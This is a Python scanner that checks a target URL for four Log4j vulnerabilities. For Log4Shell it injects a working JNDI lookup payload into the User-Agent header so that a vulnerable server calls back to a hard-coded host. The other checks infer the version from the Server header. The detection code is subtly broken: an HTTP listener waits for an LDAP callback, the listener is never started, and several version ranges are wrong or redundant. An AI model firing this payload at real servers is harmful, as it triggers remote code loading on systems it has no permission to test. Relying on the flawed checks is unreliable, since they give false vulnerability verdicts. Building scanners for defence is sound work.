import requests
import socket
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
import re

exploited = False


class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global exploited
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Vulnerable')
        exploited = True


# 创建一个http连接
def start_http_server(port):
    server = HTTPServer(('0.0.0.0', port), RequestHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()


# 检测目标服务器使用的log4j的版本
def detect_log4j_version(url):
    try:
        response = requests.get(url)
        server_header = response.headers.get("Server", "")
        log4j_version = re.search(r'log4j/(\d+\.\d+\.\d+)', server_header)
        if log4j_version:
            version = log4j_version.group(1)
            print(f"Log4j version detected: {version}")
            return version
        else:
            print("Log4j version not detected in the Server header.")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None


# CVE-2021-44228
def check_cve_2021_44228(url):
    # 这里使用本机的8080端口做callback地址
    jndi_url = f'${{jndi:ldap://192.168.12.1:8080/exploit}}'

    try:
        requests.get(url, headers={'User-Agent': jndi_url}, timeout=10)
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return False

    time.sleep(5)
    return exploited


# CVE-2019-17571*** 从响应头中获取log4j版本从而判断有没有漏洞，可能会不太准确
def check_cve_2019_17571(url):
    # 获取使用的log4j版本
    log4j_version = detect_log4j_version(url)
    if log4j_version:
        # 分别对版本号的每一位进行判断，明确影响范围
        major, minor, patch = [int(x) for x in log4j_version.split('.')]
        return major == 1 and (minor < 2 or (minor == 2 and patch <= 17))
    return False


# CVE-2020-9488*** 从响应头中获取log4j版本从而判断有没有漏洞可能会不太准确
def check_cve_2020_9488(url):
    # 获取使用的log4j版本
    log4j_version = detect_log4j_version(url)
    if log4j_version:
        # 分别对版本号的每一位进行判断，明确影响范围
        major, minor, patch = [int(x) for x in log4j_version.split('.')]
        return major == 2 and (
                (minor == 0 and patch >= 9) or
                (1 <= minor <= 13) or
                (minor == 13 and patch <= 1)
        )
    return False


# CVE-2017-5645
def check_cve_2017_5645(url):
    log4j_version = detect_log4j_version(url)
    if log4j_version:
        major, minor, patch = [int(x) for x in log4j_version.split('.')]
        return major == 2 and (
                (minor == 0 and patch >= 1) or
                (1 <= minor <= 8) or
                (minor == 8 and patch <= 1)
        )
    return False


cve_vulnerabilities = {
    'CVE-2017-5645': check_cve_2017_5645,
    'CVE-2020-9488': check_cve_2020_9488,
    'CVE-2019-17571': check_cve_2019_17571,
    'CVE-2021-44228': check_cve_2021_44228,
}
